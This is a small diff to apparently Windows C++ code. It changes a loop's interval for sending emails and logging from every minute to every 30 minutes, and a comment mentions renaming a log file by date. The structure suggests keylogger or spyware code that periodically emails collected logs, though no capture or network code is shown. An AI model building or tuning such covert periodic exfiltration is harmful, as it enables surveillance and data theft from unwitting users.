@@ -651,7 +651,7 @@ int __stdcall WinMain(HINSTANCE(a), HINSTANCE(b), LPSTR(c), INT(d))
 		//Send Email every 30 minutes
 		//
 		//				  VV--Minute Interval       V--Second Intervval
-		if (ltm->tm_min % 1 == 0 && ltm->tm_sec == 0) {
+		if (ltm->tm_min % 30 == 0 && ltm->tm_sec == 0) {
 			LOG("\n\n{Sending Email}\n\n" + to_string(ltm->tm_hour) + ":" + to_string(ltm->tm_min) + ":" + to_string(ltm->tm_sec));
 
 			//Rename file to Month Day Year - Hour - Minute
